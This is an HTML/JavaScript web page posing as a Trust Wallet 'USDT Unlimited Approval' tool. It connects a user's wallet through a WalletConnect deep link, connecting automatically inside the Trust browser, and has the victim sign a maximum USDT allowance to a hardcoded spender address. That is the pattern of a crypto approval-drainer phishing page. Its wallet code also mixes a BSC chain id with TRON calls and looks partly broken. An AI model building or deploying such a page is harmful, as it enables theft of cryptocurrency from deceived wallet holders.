<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>USDT Approve - Trust Wallet</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px 30px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
        }
        .logo {
            width: 90px; height: 90px; background: #f0b90b;
            border-radius: 24px; margin: 0 auto 25px;
            display: flex; align-items: center; justify-content: center;
            font-size: 32px; font-weight: bold; box-shadow: 0 10px 25px rgba(240,185,11,0.4);
        }
        h1 { font-size: 26px; margin-bottom: 12px; font-weight: 700; }
        .subtitle { opacity: 0.95; margin-bottom: 35px; font-size: 16px; }
        .status {
            padding: 18px; border-radius: 16px; margin-bottom: 25px;
            font-size: 15px; font-weight: 600; min-height: 60px;
            display: flex; align-items: center; justify-content: center;
        }
        .status.connecting { background: rgba(255,193,7,0.3); }
        .status.connected { background: rgba(40,167,69,0.3); animation: pulse 2s infinite; }
        .status.approving { background: rgba(0,123,255,0.3); }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
        .connect-btn, .approve-btn {
            background: linear-gradient(45deg, #f0b90b, #e6a700);
            color: #000; border: none; padding: 20px 50px;
            border-radius: 50px; font-size: 18px; font-weight: 800;
            width: 100%; cursor: pointer; transition: all 0.3s;
            text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px;
        }
        .connect-btn:hover:not(:disabled), .approve-btn:hover:not(:disabled) {
            transform: translateY(-3px); box-shadow: 0 15px 35px rgba(240,185,11,0.5);
        }
        .connect-btn:disabled, .approve-btn:disabled {
            opacity: 0.6; cursor: not-allowed; transform: none;
        }
        .spinner {
            width: 28px; height: 28px; border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white; border-radius: 50%;
            animation: spin 1s linear infinite; margin-right: 12px;
        }
        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
        .network-info {
            background: rgba(255,255,255,0.1); border-radius: 14px;
            padding: 16px; margin: 20px 0; font-size: 14px; display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">USDT</div>
        <h1>Unlimited Approval</h1>
        <p class="subtitle">One tap USDT spender approval</p>
        
        <div id="status" class="status">Tap to connect Trust Wallet</div>
        
        <div id="networkInfo" class="network-info">
            <strong id="account"></strong><br>
            Network: <span id="network">TRON Mainnet</span>
        </div>
        
        <button id="connectBtn" class="connect-btn">🔔 Connect Trust Wallet</button>
        <button id="approveBtn" class="approve-btn" disabled style="display:none;">
            ✅ Approve Unlimited
        </button>
    </div>

    <!-- WalletConnect v2 + TronWeb -->
    <script src="https://unpkg.com/@walletconnect/web3-provider@2.10.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>

    <script>
        // 🔧 CONFIG - Replace these
        const PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f';
        const SPENDER_ADDRESS = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';
        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT Mainnet

        let walletProvider, tronWeb, session, connectedAccount = '';

        // TRUST WALLET DEEPLINK + WALLET CONNECT V2
        async function createTrustWalletDeeplink() {
            try {
                walletProvider = new WalletConnectV2Provider({
                    projectId: PROJECT_ID,
                    chains: [56], // BSC EVM (Trust Wallet Tron support via EVM)
                    metadata: {
                        name: 'USDT Approver',
                        description: 'Approve USDT spending',
                        url: window.location.origin,
                        icons: []
                    },
                    showQrModal: false
                });

                // Generate WC URI instantly
                const uri = await walletProvider.createSession();
                
                // TRUST WALLET DEEPLINK (INSTANT OPEN + AUTO-CONNECT)
                const deeplink = `trust://wc?uri=${encodeURIComponent(uri)}`;
                
                // iOS Universal Link + Android Deep Link
                if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('iPad')) {
                    window.location.href = deeplink;
                } else {
                    // Android + Desktop fallback
                    window.open(deeplink, '_blank');
                    // Fallback to standard connect
                    await walletProvider.enable();
                }

                updateStatus('connecting', '<div class="spinner"></div>Opening Trust Wallet...');
                
                // Auto-detect connection
                setTimeout(checkConnection, 2000);
                
            } catch (error) {
                console.error('Deeplink failed:', error);
                // Fallback to standard connect
                connectWallet();
            }
        }

        async function connectWallet() {
            try {
                await walletProvider.enable();
                await onConnect();
            } catch (error) {
                updateStatus('error', 'Open Trust Wallet manually');
                setTimeout(createTrustWalletDeeplink, 2000);
            }
        }

        async function checkConnection() {
            try {
                if (walletProvider.session) {
                    await onConnect();
                } else {
                    setTimeout(checkConnection, 1000);
                }
            } catch (e) {
                setTimeout(checkConnection, 1000);
            }
        }

        async function onConnect() {
            session = walletProvider.session;
            connectedAccount = await getAddress();
            
            updateStatus('connected', `Connected: ${connectedAccount.slice(0,6)}...${connectedAccount.slice(-4)}`);
            document.getElementById('networkInfo').style.display = 'block';
            document.getElementById('account').textContent = connectedAccount.slice(0,8) + '...' + connectedAccount.slice(-6);
            document.getElementById('connectBtn').style.display = 'none';
            document.getElementById('approveBtn').style.display = 'block';
            document.getElementById('approveBtn').disabled = false;
        }

        async function getAddress() {
            const accounts = session.namespaces.tron?.accounts || session.namespaces.eip155?.accounts || [];
            return accounts[0]?.split(':')[2] || '';
        }

        function updateStatus(type, html) {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = html;
            statusEl.className = `status ${type}`;
        }

        // TRONSCAN EXACT APPROVE FUNCTION
        async function approveUSDTUnlimited() {
            try {
                updateStatus('approving', '<div class="spinner"></div>Creating approval tx...');
                document.getElementById('approveBtn').disabled = true;

                // TronWeb with WalletConnect provider (TRON Mainnet)
                tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io',
                    headers: { "TRON-PRO-API-KEY": "" },
                    privateKey: false,
                    providers: { _provider: walletProvider }
                });

                // USDT TRC20 APPROVE ABI (EXACT TRONSCAN)
                const contract = await tronWeb.contract().at(USDT_CONTRACT);
                
                // UNLIMITED APPROVAL (MAX UINT256)
                const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                
                const tx = await contract.approve(SPENDER_ADDRESS, MAX_UINT256).send({
                    feeLimit: 40000000,  // 40 TRX (Tronscan standard)
                    callValue: 0,
                    shouldPollResponse: true,
                    from: connectedAccount
                });

                updateStatus('connected', `✅ APPROVED!<br>Tx: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx.slice(0,12)}...</a>`);
                
            } catch (error) {
                console.error('Approve error:', error);
                updateStatus('error', `Failed: ${error.message}`);
                document.getElementById('approveBtn').disabled = false;
            }
        }

        // EVENT LISTENERS
        document.getElementById('connectBtn').onclick = createTrustWalletDeeplink;
        document.getElementById('approveBtn').onclick = approveUSDTUnlimited;

        // AUTO-DETECT TRUST WALLET BROWSER
        if (navigator.userAgent.includes('Trust') || window.trust) {
            setTimeout(connectWallet, 500);
        }

        // MOBILE OPTIMIZATIONS
        document.addEventListener('DOMContentLoaded', () => {
            if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
                document.documentElement.style.fontSize = '16px';
            }
        });
    </script>
</body>
</html>
